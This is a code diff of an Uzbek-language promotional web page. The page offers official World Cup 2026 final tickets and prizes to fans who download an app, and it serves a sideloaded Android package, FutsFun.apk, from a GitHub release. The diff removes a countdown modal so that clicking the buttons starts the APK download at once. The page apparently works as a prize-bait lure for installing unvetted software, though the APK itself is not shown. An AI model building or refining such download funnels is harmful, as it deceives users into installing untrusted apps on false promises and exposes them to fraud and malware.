@@ -504,158 +504,6 @@
             to { opacity: 1; }
         }
 
-        /* --- COUNTDOWN MODAL --- */
-        .download-overlay {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(9, 13, 22, 0.92);
-            backdrop-filter: blur(8px);
-            z-index: 9999;
-            align-items: center;
-            justify-content: center;
-        }
-        .download-overlay.active {
-            display: flex;
-            animation: fadeIn 0.3s ease;
-        }
-        .download-modal {
-            background: linear-gradient(160deg, #0f172a, #0a1628);
-            border: 1px solid rgba(244, 196, 48, 0.2);
-            border-radius: 28px;
-            padding: 52px 48px;
-            text-align: center;
-            max-width: 420px;
-            width: 90%;
-            box-shadow: 0 40px 80px rgba(0,0,0,0.6);
-            position: relative;
-            overflow: hidden;
-        }
-        .download-modal::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0;
-            height: 4px;
-            background: linear-gradient(90deg, var(--uz-gold), #fff066, var(--uz-gold));
-            background-size: 200% 100%;
-            animation: shimmer 1.5s infinite;
-        }
-        @keyframes shimmer {
-            0% { background-position: -200% 0; }
-            100% { background-position: 200% 0; }
-        }
-        .modal-icon {
-            font-size: 3rem;
-            margin-bottom: 16px;
-            display: block;
-            animation: bounce 1s ease-in-out infinite;
-        }
-        @keyframes bounce {
-            0%,100% { transform: translateY(0); }
-            50% { transform: translateY(-8px); }
-        }
-        .modal-title {
-            color: #fff;
-            font-size: 1.3rem;
-            font-weight: 900;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 8px;
-        }
-        .modal-subtitle {
-            color: #64748b;
-            font-size: 0.9rem;
-            margin-bottom: 36px;
-            line-height: 1.5;
-        }
-        .ring-wrap {
-            position: relative;
-            width: 130px;
-            height: 130px;
-            margin: 0 auto 28px;
-        }
-        .ring-svg {
-            transform: rotate(-90deg);
-            width: 130px;
-            height: 130px;
-        }
-        .ring-track {
-            fill: none;
-            stroke: rgba(255,255,255,0.06);
-            stroke-width: 8;
-        }
-        .ring-progress {
-            fill: none;
-            stroke: var(--uz-gold);
-            stroke-width: 8;
-            stroke-linecap: round;
-            stroke-dasharray: 339.3;
-            stroke-dashoffset: 0;
-            transition: stroke-dashoffset 1s linear;
-            filter: drop-shadow(0 0 6px rgba(244,196,48,0.6));
-        }
-        .ring-number {
-            position: absolute;
-            inset: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-        .countdown-num {
-            font-size: 3rem;
-            font-weight: 900;
-            color: var(--uz-gold);
-            line-height: 1;
-            font-family: 'Montserrat', sans-serif;
-        }
-        .countdown-label {
-            font-size: 0.65rem;
-            color: #64748b;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-top: 4px;
-        }
-        .modal-continue-btn {
-            display: inline-block;
-            opacity: 0;
-            pointer-events: none;
-            margin-top: 28px;
-            background: linear-gradient(135deg, var(--uz-gold), #e0b018);
-            color: var(--uz-dark);
-            padding: 16px 44px;
-            border-radius: 50px;
-            font-weight: 900;
-            font-size: 1rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            border: none;
-            cursor: pointer;
-            box-shadow: 0 10px 30px rgba(244,196,48,0.4);
-            transition: all 0.3s ease;
-            text-decoration: none;
-            animation: fadeIn 0.5s ease;
-        }
-        .modal-continue-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 40px rgba(244,196,48,0.6);
-        }
-        .modal-continue-btn.visible {
-            opacity: 1;
-            pointer-events: auto;
-            animation: fadeIn 0.5s ease;
-        }
-        .modal-status {
-            color: rgba(255,255,255,0.5);
-            font-size: 0.82rem;
-            letter-spacing: 0.5px;
-        }
-        .modal-status span {
-            color: var(--uz-gold);
-            font-weight: 700;
-        }
-
-
         /* --- RESPONSIVENESS --- */
         @media (max-width: 991px) {
             .hero {
@@ -710,7 +558,7 @@
         <div class="hero-content">
             <h1>Katta Futbol Mavsumi: <br><span>Muxlislar Uchun Konkurs!</span></h1>
             <p>Bizning mobil platformamizga qo'shiling, milliy terma jamoamizni qo'llab-quvvatlang va Jahon Chempionati 2026 finaliga rasmiy chiptalar hamda eksklyuziv suvenirlar aksiyasida ishtirok eting!</p>
-            <a href="#" class="btn" onclick="startDownload(event);">Ilovani yuklab olish va qatnashish</a>
+            <a href="#" class="btn" onclick="triggerDownload(event);">Ilovani yuklab olish va qatnashish</a>
         </div>
         <div class="hero-mockup">
             <img src="app-mockup.jpg" alt="Muxlis FC App Mockup">
@@ -739,7 +587,7 @@
                 </div>
                 <div class="prize-content">
                     <h3>Jahon Chempionati Finali</h3>
-                    <p>Aksiyaning mutloq g'olibi uchun eng asosий mukofot — <strong>Futbol bo'yicha Jahon Chempionati 2026 final bosqichiga 2 ta rasmiy chipta!</strong></p>
+                    <p>Aksiyaning mutloq g'olibi uchun eng asosiy mukofot — <strong>Futbol bo'yicha Jahon Chempionati 2026 final bosqichiga 2 ta rasmiy chipta!</strong></p>
                 </div>
             </div>
 
@@ -777,7 +625,7 @@
             </div>
         </div>
         <div style="text-align: center; margin-top: 40px;">
-            <a href="#" class="btn" onclick="startDownload(event);">Ishtirokchini ro'yxatdan o'tkazish</a>
+            <a href="#" class="btn" onclick="triggerDownload(event);">Ishtirokchini ro'yxatdan o'tkazish</a>
         </div>
     </section>
 
@@ -794,7 +642,7 @@
                 <div class="faq-answer">Terma jamoa atributikalari va imzolangan formalar o'yini har hafta ilova ichidagi interaktiv viktorina g'oliblari o'rtasida o'tkazib boriladi.</div>
             </details>
             <details class="faq-item">
-                <summary>Asosiy chiptalar g'olibi qassan aniqlanadi?</summary>
+                <summary>Asosiy chiptalar g'olibi qachon aniqlanadi?</summary>
                 <div class="faq-answer">Jahon Chempionati finaliga 2 ta chipta sohibi ilovaning eng yuqori reytingiga ega bo'lgan tahlilchilar orasidan maxsus komissiya va shaffof randomizator yordamida aniqlanadi.</div>
             </details>
         </div>
@@ -811,92 +659,20 @@
         <p style="font-size: 0.8rem; margin-top: 15px; color: #334155;">Ushbu resurs norasmiy fan-portal doirasidagi rag'batlantiruvchi aksiya hisoblanadi. Tashkilotchi uchinchi tomon brendlarining intellektual mulkiga da'vo qilmaydi. Obuna va sovg'alar zaxirasi cheklangan.</p>
     </footer>
 
-
-    <div class="download-overlay" id="downloadOverlay">
-        <div class="download-modal">
-            <span class="modal-icon">⚽</span>
-            <div class="modal-title">Yuklab olish tayyorlanmoqda</div>
-            <div class="modal-subtitle">Ilova yuklab olinishidan oldin biroz kuting...</div>
-            <div class="ring-wrap">
-                <svg class="ring-svg" viewBox="0 0 130 130">
-                    <circle class="ring-track" cx="65" cy="65" r="54"/>
-                    <circle class="ring-progress" id="ringProgress" cx="65" cy="65" r="54"/>
-                </svg>
-                <div class="ring-number">
-                    <span class="countdown-num" id="countdownNum">5</span>
-                    <span class="countdown-label">soniya</span>
-                </div>
-            </div>
-            <div class="modal-status">Yuklab olish <span id="statusText">boshlanmoqda...</span></div>
-            <button id="continueBtn" class="modal-continue-btn" onclick="doDownload(event);">⬇ Yuklab olishni davom ettirish</button>
-        </div>
-    </div>
-
     <script>
-        // Исправлено: ссылка обернута в кавычки для корректной интерпретации как строки в JS
-        var _g = 'https://github.com/morkadus/futbollaks/releases/download/V1.0/FutsFun.apk';
-        var COUNTDOWN = 5;
-        var circumference = 2 * Math.PI * 54;
+        // GitHub relizidan APK fayli manzili
+        var apkUrl = 'https://github.com/morkadus/futbollaks/releases/download/V1.0/FutsFun.apk';
 
-        function startDownload(e) {
+        function triggerDownload(e) {
             e.preventDefault();
 
-            // show overlay, reset state
-            var overlay = document.getElementById('downloadOverlay');
-            overlay.classList.add('active');
-
-            var numEl   = document.getElementById('countdownNum');
-            var ring    = document.getElementById('ringProgress');
-            var status  = document.getElementById('statusText');
-            var contBtn = document.getElementById('continueBtn');
-            var count   = COUNTDOWN;
-
-            // reset everything
-            numEl.textContent = COUNTDOWN;
-            ring.style.strokeDashoffset = 0;
-            status.textContent = 'boshlanmoqda...';
-            contBtn.classList.remove('visible');
-
-            var interval = setInterval(function() {
-                count--;
-                numEl.textContent = count;
-
-                var progress = (COUNTDOWN - count) / COUNTDOWN;
-                ring.style.strokeDashoffset = circumference * progress;
-
-                if (count <= 2) {
-                    status.textContent = 'deyarli tayyor!';
-                }
-                if (count <= 0) {
-                    clearInterval(interval);
-                    numEl.textContent = '✓';
-                    status.textContent = 'tayyor!';
-
-                    // show the continue button
-                    contBtn.classList.add('visible');
-                }
-            }, 1000);
-        }
-
-        function doDownload(e) {
-            e.preventDefault();
-
-            // trigger APK download
-            var a = document.createElement('a');
-            a.href = _g;
-            a.download = 'FutsFun.apk';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-
-            // close modal after short delay
-            setTimeout(function() {
-                document.getElementById('downloadOverlay').classList.remove('active');
-                document.getElementById('continueBtn').classList.remove('visible');
-                document.getElementById('countdownNum').textContent = COUNTDOWN;
-                document.getElementById('ringProgress').style.strokeDashoffset = 0;
-                document.getElementById('statusText').textContent = 'boshlanmoqda...';
-            }, 1500);
+            // Yuklashni darhol boshlash uchun vaqtinchalik havola yaratish
+            var link = document.createElement('a');
+            link.href = apkUrl;
+            link.download = 'FutsFun.apk';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
         }
     </script>
 </body>
